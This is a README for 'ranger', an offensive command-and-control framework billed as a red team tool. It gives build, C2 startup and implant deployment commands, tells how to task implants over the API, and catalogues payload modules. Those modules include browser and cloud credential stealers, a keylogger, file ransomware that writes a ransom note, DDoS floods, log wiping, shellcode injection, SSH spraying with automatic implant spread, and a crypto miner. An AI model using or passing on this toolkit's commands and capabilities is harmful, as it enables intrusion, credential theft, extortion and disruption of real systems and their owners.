# RANGER-C3

Distributed multi-node mesh C2 framework
`github.com/saviorSEC/ranger`.

```
  ██████  █████  ███    ██  ██████  ███████ ██████  
  ██   ██ ██   ██ ████   ██ ██       ██      ██   ██ 
  ██████  ███████ ██ ██  ██ ██   ███ █████   ██████  
  ██   ██ ██   ██ ██  ██ ██ ██    ██ ██      ██   ██ 
  ██   ██ ██   ██ ██   ████  ██████  ███████ ██   ██ 
```

**ranger** is a distributed, multi-node Command & Control framework built for red team operations. It features a P2P mesh topology for resilience, an encrypted implant channel, DNS tunneling fallback, AEAD-enveloped REST fallback, a full operator web dashboard, and a library of native Go payload modules.

---

## Key Features

| Capability | Description |
|---|---|
| Mesh topology | Distributed C2 nodes with P2P heartbeat — no single point of failure |
| Primary channel | WebSocket over HTTP/2 with XChaCha20-Poly1305 encrypted frames (shared session key) |
| Fallback channels | AEAD-enveloped HTTPS REST beacon/result + DNS tunneling (base32 + AEAD) |
| Mesh integrity | Ed25519-signed heartbeats verified against mTLS peer certificates |
| Operator dashboard | Full SPA web UI — clickable implant drill-down, interactive shell, payload executor |
| Payload system | 24 native Go payload modules — compiled, no Python needed at runtime |
| Crypto | Ed25519 signing, XChaCha20-Poly1305 AEAD, SHA-256 key derivation, shared session key via `-key` |
| Auth | bcrypt or constant-time password check, JWT sessions with expiry |
| Persistence | SQLite (WAL mode, concurrent) |

---

## Architecture

```
                     ┌──────────────────────┐
                     │    C2 Node Alpha     │
                     │  (WS + REST + UI)    │
                     └──────────┬───────────┘
                                │
          ┌─────────────────────┼──────────────────────┐
          │                     │                      │
          ▼                     ▼                      ▼
   ┌────────────┐        ┌────────────┐         ┌────────────┐
   │ C2 Node B  │◄──────►│ C2 Node C  │◄───────►│ C2 Node D  │
   │  (mesh)    │        │  (mesh)    │         │  (mesh)    │
   └───────┬────┘        └──────┬─────┘         └──────┬─────┘
           │                    │                      │
           ▼                    ▼                      ▼
      Implants              Implants               Implants
   (WS / HTTPS)          (DNS tunnel)            (P2P relay)
```

### Communication Channels (in order of preference)

1. **WebSocket** (`/ws`) — Primary channel, persistent bi-directional, encrypted
2. **HTTPS POST** (`/api/v1/beacon`, `/api/v1/result`) — Fallback REST polling
3. **DNS Tunnel** (`/dns/<id>/<type>`) — Base32 + AEAD DNS query exfiltration
4. **P2P Mesh** — Implant-to-implant relay via mesh peers

### Crypto Stack

- **Signing**: Ed25519 with timestamp + nonce replay protection; mesh heartbeats signed per node
- **Session encryption**: XChaCha20-Poly1305 AEAD with an operator-set session key
- **REST fallback**: AEAD envelope (`{"data": b64(nonce||ct)}`) - no plaintext implant traffic
- **Key derivation**: SHA-256 with domain separation
- **TLS**: Optional mTLS between mesh peers

---

## Quick Start

### 1. Build

```bash
make build
```

Or individual targets:

```bash
make c2          # Linux C2 server
make implant     # Cross-compile implants (win/linux/mac)
make stager      # Cross-compile stagers (win/linux)
make payloads    # Build standalone payload binaries
```

### 2. Start C2

```bash
# Basic (self-signed TLS, standalone). Set a session key so implants can
# encrypt; omit -key and the server generates and prints one.
./build/ranger-c2 \
  --listen :4443 \
  --password "opsec" \
  --key 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef \
  --db data/c2.db \
  --gen-certs

# With P2P mesh
./build/ranger-c2 \
  --listen :4443 \
  --mesh :9000 \
  --bootstrap "10.0.0.2:9000,10.0.0.3:9000" \
  --password "opsec" \
  --key 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef \
  --db data/c2.db \
  --gen-certs

# Password may be a plaintext secret or a bcrypt hash ($2a/$2b/$2y prefix).
# TLS key file flag is --tls-key (--key is the implant session key).
```

### 3. Access Dashboard

```
https://your-c2:4443/dashboard
```

Login with the password you set. The dashboard auto-refreshes every 12 seconds.

### 4. Deploy Implant

```bash
# On target (must match the server session key):
./build/implant \
  --c2 wss://your-c2:4443/ws \
  --key 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef \
  --beacon-min 60 \
  --beacon-max 300

# With DNS fallback
./build/implant \
  --c2 wss://your-c2:4443/ws \
  --key 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef \
  --dns-domain "c2.example.com" \
  --beacon-min 120 \
  --beacon-max 600
```

### 5. Send Tasks

```bash
# Via API
curl -sk https://your-c2:4443/api/dashboard/task \
  -H 'Authorization: Bearer <token>' \
  -H 'Content-Type: application/json' \
  -d '{"implant_id":"<id>","type":"shell","payload":{"command":"whoami"}}'

# Execute a Go payload module
curl -sk https://your-c2:4443/api/dashboard/task \
  -H 'Authorization: Bearer <token>' \
  -H 'Content-Type: application/json' \
  -d '{"implant_id":"<id>","type":"payload","payload":{"name":"sysrecon","args":"--quick"}}'
```

---

## Operator Dashboard

The web dashboard is a fully interactive single-page application embedded in the C2 binary. Access at `/dashboard`.

### Implant List

- Sortable table: ID, Type, Hostname, Arch, Process, Status (Online/Offline), Beacons, Tasks, Last Seen
- Search bar filters by hostname, ID, type, or process
- Status filter: All / Online / Offline / Flagged / DNS
- Click any row to open the implant detail panel

### Implant Detail

Four-tab interface for each implant:

| Tab | Features |
|-----|----------|
| **Shell** | Interactive command input with terminal-style output log. Sends `shell` task type. Output shows on next beacon. |
| **Tasks** | Task history table (pending, delivered, completed). Custom task form — enter any type + JSON payload manually. |
| **Payload** | Dropdown of all available Go payloads (fetched from `/api/dashboard/payloads`). Argument input field. Execute button creates a `payload` task. |
| **Actions** | One-click quick actions: recon, sleep, screenshot, persist, self-destruct (with confirmation modal). Full implant metadata key-value display. Exfiltrated data viewer. |

### Mesh Peers

- Table of connected C2 mesh nodes: ID, Address, Implant Count, Last Seen, Version
- Live count stats cards

### Payloads

- Full manifest table from the payloads directory: Name, Category, Description, Platform, File
- Run on Implant — select an implant and execute any payload from the UI

---

## Payload Modules

All payloads are native Go — compiled binaries, no Python runtime required. The implant calls payloads in-process via the `internal/payloads` registry, or they can run standalone:

```bash
# List available payloads
go run ./cmd/payloads --list

# Run a payload standalone
go run ./cmd/payloads sysrecon
go run ./cmd/payloads ddos --arg target=10.0.0.5 --arg port=80 --arg duration=60 --arg mode=http
go run ./cmd/payloads fileransom --arg dir=/tmp/test --arg action=encrypt
```

### Payload Catalog

#### Reconnaissance
| Payload | Description |
|---------|-------------|
| `sysrecon` | Full system enumeration — OS, kernel, users, groups, processes, network interfaces, hardware, software, defenses, listening ports |
| `cloud_detector` | Detect cloud environment (AWS, Azure, GCP, DigitalOcean, Docker, Kubernetes) via metadata endpoints and DMI |
| `linpeas` | Lightweight Linux PEAS scanner — sudo perms, SUID, writable paths, cron, capabilities, kernel exploit checks |

#### Credential Theft
| Payload | Description |
|---------|-------------|
| `browserstealer` | Extract saved credentials, cookies, history, bookmarks from Chrome, Firefox, Edge, Brave, Safari |
| `hashdump` | Dump /etc/shadow hashes (requires root), SSH private keys, passwd data |
| `aws_cred_stealer` | Harvest AWS credentials from IMDS metadata, env vars, CLI config, ECS endpoints, Lambda runtime, userdata |
| `azure_cred_harvester` | Harvest Azure tokens from IMDS, env vars, Azure CLI config, Key Vault access |
| `k8s_secret_stealer` | Extract K8s secrets via API, kubeconfig files, service account tokens, mounted volumes |

#### Collection
| Payload | Description |
|---------|-------------|
| `keylogger` | Capture keystrokes via `showkey` or `xinput test` on Linux |
| `screenshot` | Capture screen via `import` (ImageMagick), `xwd`, `scrot`, or `gnome-screenshot` |

#### Persistence
| Payload | Description |
|---------|-------------|
| `persistence` | Establish persistence via cron jobs, systemd timers, anacron, AT jobs |
| `process_inject` | Linux ptrace-based shellcode injection into target process (requires root) |

#### Evasion
| Payload | Description |
|---------|-------------|
| `filehider` | Hide files via chattr +i, extended attributes, ACLs, timestomping, decoy files |
| `logcleaner` | Clean forensic traces from auth.log, syslog, journald, wtmp, btmp, bash_history, lastlog |
| `polyloader` | Polymorphic XOR loader for shellcode with variable key length |

#### Lateral Movement
| Payload | Description |
|---------|-------------|
| `sshspray` | SSH credential spraying with goroutine worker pool. Supports CIDR ranges, IP ranges, custom wordlists |
| `container_escape` | Container escape techniques: privileged check, Docker socket escape, cgroup mount, nsenter host namespace, sensitive mount discovery |
| `autodeploy` | Host discovery (fping, TCP port scan) + SSH credential brute-force + implant deployment |

#### Impact
| Payload | Description |
|---------|-------------|
| `fileransom` | AES-256-GCM file encryption with PBKDF2 key derivation. Generates ransom note. Supports directory walk with skip-lists. |
| `ddos` | Multi-method DoS: HTTP flood, TLS handshake, UDP flood, TCP SYN flood, Slow POST (RUDY), WebSocket flood, combo. Goroutine-concurrent, context-cancellable. |
| `competitor_cleaner` | Detect and kill competing/miner processes, remove malicious files, clean cron entries |
| `mine` | Monero stratum mining client |

#### Exploit
| Payload | Description |
|---------|-------------|
| `copyfail` | CVE-2026-31431 — Linux kernel LPE via AF_ALG page-cache corruption (kernels 4.14+, no compilation needed on target) |

#### Exfiltration
| Payload | Description |
|---------|-------------|
| `dnstunnel` | DNS tunneling: fragment data into base32-encoded AES-encrypted DNS queries. Reassembly with sequence numbers on server side. |

---

## API Reference

### Implant Endpoints

| Method | Path | Description |
|--------|------|-------------|
| WebSocket | `/ws` | Primary implant channel (upgrade + encrypted binary frames) |
| POST | `/api/v1/beacon` | Fallback HTTP beacon - AEAD envelope `{"data": b64(nonce||ct)}` |
| POST | `/api/v1/result` | Task result submission - AEAD envelope `{"data": b64(nonce||ct)}` |
| Any | `/dns/<id>/<type>` | DNS exfil reception - raw body as exfil data |

Implant REST traffic is encrypted with the shared session key; plaintext
bodies are rejected.

### Operator API (JWT-authenticated)

| Method | Path | Description |
|--------|------|-------------|
| POST | `/api/dashboard/login` | Authenticate — body: `{"password":"..."}`, returns `{"token":"..."}` |
| GET | `/api/dashboard/config` | C2 info — version, node ID, implant/peer counts, uptime |
| GET | `/api/dashboard/implants` | List all registered implants |
| GET | `/api/dashboard/implant/<id>` | Single implant details |
| GET | `/api/dashboard/tasks/<id>` | Tasks for implant `<id>` |
| POST | `/api/dashboard/task` | Create a task — body: `{"implant_id":"...","type":"...","payload":{...}}` |
| GET | `/api/dashboard/peers` | List mesh-connected C2 nodes |
| GET | `/api/dashboard/payloads` | List available payload modules from manifest |
| GET | `/api/dashboard/exfil/<id>` | Exfiltrated data for implant `<id>` |

### Task Types

| Type | Payload | Description |
|------|---------|-------------|
| `shell` | `{"command":"whoami"}` | Execute a shell command on target |
| `payload` | `{"name":"sysrecon","args":"--quick"}` | Run a Go payload module in-process |
| `recon` | `{}` | Quick system recon |
| `sleep` | `{"duration":3600}` | Change beacon interval |
| `upload` | `{"path":"/tmp/file"}` | Upload file from target to C2 (queued) |
| `download` | `{"url":"https://...", "path":"/tmp/out"}` | Download file to target (queued) |
| `exit` | `{}` | Self-destruct implant |

---

## Project Structure

```
ranger/
├── cmd/
│   ├── c2/              # C2 server entry point
│   ├── stager/          # Stager binary entry point
│   └── payloads/        # Standalone payload CLI
├── internal/
│   ├── api/             # HTTP/WS server, routes, embedded dashboard
│   ├── crypto/          # Ed25519, XChaCha20-Poly1305, key derivation
│   ├── dns/             # DNS tunnel client
│   ├── implantpkg/      # Core implant logic (beacon, exec, execPayload)
│   ├── mesh/            # P2P mesh networking
│   ├── protocol/        # Shared types (beacon, task, result, implant, mesh)
│   ├── store/           # SQLite database layer
│   └── payloads/        # 24 native Go payload modules
├── payloads/            # Legacy Python payloads (deprecated)
├── deploy.sh            # Deployment script
├── go.mod / go.sum
└── README.md
```

---

## Command-Line Flags

### C2 Server (`./build/ranger-c2`)

| Flag | Default | Description |
|------|---------|-------------|
| `--listen` | `:4443` | C2 listen address |
| `--mesh` | `""` | P2P mesh listen address (empty = no mesh) |
| `--bootstrap` | `""` | Comma-separated bootstrap mesh peers |
| `--db` | `data/c2.db` | SQLite database path |
| `--password` | `""` | Dashboard login password (plaintext or bcrypt hash) |
| `--key` | auto | Implant session key (64 hex chars); generated and printed when omitted |
| `--cert` / `--tls-key` | `""` | TLS certificate and key files |
| `--gen-certs` | `false` | Generate self-signed TLS certs |
| `--id` | auto | C2 node identifier |

### Implant (`./build/implant`)

| Flag | Default | Description |
|------|---------|-------------|
| `--c2` | required | C2 WebSocket URL (e.g., `wss://host:4443/ws`) |
| `--key` | auto | Session key hex - must match the C2 server |
| `--dns-domain` | `""` | DNS tunneling fallback domain |
| `--beacon-min` | `60` | Minimum beacon interval (seconds) |
| `--beacon-max` | `300` | Maximum beacon interval (seconds) |
| `--debug` | `false` | Enable verbose logging |



